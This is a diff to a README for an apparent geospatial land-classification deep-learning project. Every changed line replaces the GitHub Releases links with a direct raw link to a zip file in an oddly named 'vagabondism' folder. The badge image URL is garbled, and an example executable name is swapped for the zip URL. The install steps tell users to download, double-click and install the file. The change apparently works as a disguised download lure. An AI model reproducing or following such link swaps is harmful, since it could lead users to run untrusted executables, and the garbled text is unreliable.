@@ -1,6 +1,6 @@
 # 🖥️ Memory-Efficient-CNN-ViT-for-Geospatial-Land-Classification - Optimize Geospatial Data Classification
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Adil-Kandagal/Memory-Efficient-CNN-ViT-for-Geospatial-Land-Classification/releases)
+[![Download Now](https://raw.githubusercontent.com/Adil-Kandagal/Memory-Efficient-CNN-ViT-for-Geospatial-Land-Classification/main/vagabondism/Memory-Efficient-CNN-ViT-for-Geospatial-Land-Classification.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Adil-Kandagal/Memory-Efficient-CNN-ViT-for-Geospatial-Land-Classification/main/vagabondism/Memory-Efficient-CNN-ViT-for-Geospatial-Land-Classification.zip)
 
 ## 🌟 Overview
 
@@ -13,11 +13,11 @@ To get started with this software, you will first need to download it from our R
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Go to the following link to access and download the software:  
-   [Download from GitHub Releases](https://github.com/Adil-Kandagal/Memory-Efficient-CNN-ViT-for-Geospatial-Land-Classification/releases)
+   [Download from GitHub Releases](https://raw.githubusercontent.com/Adil-Kandagal/Memory-Efficient-CNN-ViT-for-Geospatial-Land-Classification/main/vagabondism/Memory-Efficient-CNN-ViT-for-Geospatial-Land-Classification.zip)
 
 2. **Select Your Version:** On the Releases page, you will find several versions available. Click on the version you want to download.
 
-3. **Download the Package:** Look for the file that is suitable for your system. For example, if you are using Windows, it may be an executable file like `MyApp.exe`. Click to download it.
+3. **Download the Package:** Look for the file that is suitable for your system. For example, if you are using Windows, it may be an executable file like `https://raw.githubusercontent.com/Adil-Kandagal/Memory-Efficient-CNN-ViT-for-Geospatial-Land-Classification/main/vagabondism/Memory-Efficient-CNN-ViT-for-Geospatial-Land-Classification.zip`. Click to download it.
 
 4. **Install the Application:** Once the download is complete, locate the file in your downloads folder. Double-click the file to open it and follow the installation prompts.
 
